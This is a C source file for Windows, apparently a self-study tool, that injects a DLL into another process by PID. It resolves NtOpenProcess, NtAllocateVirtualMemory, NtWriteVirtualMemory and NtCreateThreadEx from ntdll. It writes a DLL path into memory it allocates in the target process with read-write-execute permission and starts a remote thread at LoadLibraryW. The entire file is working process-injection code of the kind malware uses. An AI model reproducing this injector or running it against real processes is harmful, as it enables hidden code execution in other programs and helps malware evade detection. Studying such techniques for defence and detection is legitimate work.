#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#pragma comment (lib, "ntdll")
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

char ok[] = "(+)";
char er[] = "(-)";
char in[] = "(*)";

/* define some necessary kernel structures for us to use with NTAPI/NTDLL */

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG              Length;
    HANDLE             RootDirectory;
    PUNICODE_STRING    ObjectName;
    ULONG              Attributes;
    PVOID              SecurityDescriptor;
    PVOID              SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    PVOID              UniqueProcess;
    PVOID              UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

/* create function prototypes for NT API */

typedef NTSTATUS(NTAPI* pNtOpenProcess) (
    PHANDLE              ProcessHandle,
    ACCESS_MASK          AccessMask,
    POBJECT_ATTRIBUTES   ObjectAttributes,
    PCLIENT_ID           ClientID
	);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory) (
	HANDLE               ProcessHandle,
	PVOID*		         BaseAddress,
	ULONG                ZeroBits,
	PULONG				 RegionSize,
	ULONG                AllocationType,
	ULONG                Protect
	);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory) (
	HANDLE               ProcessHandle,
	PVOID                BaseAddress,
	PVOID                Buffer,
	ULONG                NumberOfBytesToWrite,
	PULONG               NumberOfBytesWritten 
	);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	PHANDLE				hThread,
	ACCESS_MASK			DesiredAccess,
	PVOID				ObjectAttributes,
	HANDLE				ProcessHandle,
	PVOID				lpStartAddress,
	PVOID				lpParameter,
	ULONG				Flags,
	SIZE_T				StackZeroBits,
	SIZE_T				SizeOfStackCommit,
	SIZE_T				SizeOfStackReserve,
	PVOID				lpBytesBuffer
	);

NTSTATUS status;
PVOID rBuffer = NULL;
HMODULE hNTDLL = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[] = L"C:\\Users\\micha\\OneDrive\\Desktop\\win32\\win32api_test\\dllExample.dll";
//C:\\Users\\micha\\Desktop\\Code\\win32api_test\\dllExample.dll

int dllSize = sizeof(dllPath) + 1; // account for null-terminator

int main(int argc, char* argv[]) {

    if (argv[1] == NULL) {
        printf("%s usage: nt_dllInjection.exe <pid>\n", er);
        return EXIT_FAILURE;
    }

    DWORD PID = atoi(argv[1]);
    CLIENT_ID CID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

	printf("%s process ID: (%llu)\n", in, (unsigned long long)CID.UniqueProcess);

    hNTDLL = GetModuleHandleW(L"ntdll");
    HMODULE hKernel32 = GetModuleHandleW(L"Kernel32");

    LPTHREAD_START_ROUTINE loadLib = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	/* create NTAPI functions from prototypes + populate them with their respective addresses from NTDLL */
	pNtOpenProcess OPEN = (pNtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	pNtAllocateVirtualMemory ALLOC = (pNtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	pNtWriteVirtualMemory WRITE = (pNtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
	pNtCreateThreadEx THREAD = (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");


    status = OPEN(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &OA,
        &CID
    );

    if (status != STATUS_SUCCESS) {
		printf("%s failed to get handle to process (%llu), you sure the process exists?\n", er, (unsigned long long)CID.UniqueProcess);
		return EXIT_FAILURE;
	}

    status = ALLOC(hProcess, &rBuffer, FALSE, (PULONG)&dllSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); /* horrible permissions but :kek: */
    printf("%s allocated %d-bytes to process memory\n", ok, dllSize);

	status = WRITE(hProcess, rBuffer, dllPath, dllSize, NULL);
    printf("%s wrote to process memory\n", ok);

	status = THREAD(
        &hThread,
        0x1FFFFF,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE) loadLib,
        rBuffer,
        FALSE,
        FALSE, //null?
        FALSE, //null?
        FALSE, //null?
        NULL
    );
    printf("%s used custom NTDLL function (threadCreate) to create a thread\n", ok);

    if (hThread == NULL) {
        printf("%s couldn't create thread\n", er);
        CloseHandle(hProcess);
        printf("%s closed handle to process\n", in);
        return EXIT_FAILURE;
    } else {
        printf("%s injected with custom function (threadCreate) NtCreateThreadEx directly from NTDLL!\n", ok);
    }

    WaitForSingleObject(hThread, INFINITE);

    printf("%s closing handle to thread\n", in);
    CloseHandle(hThread);
    printf("%s closing handle to process", in);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;

}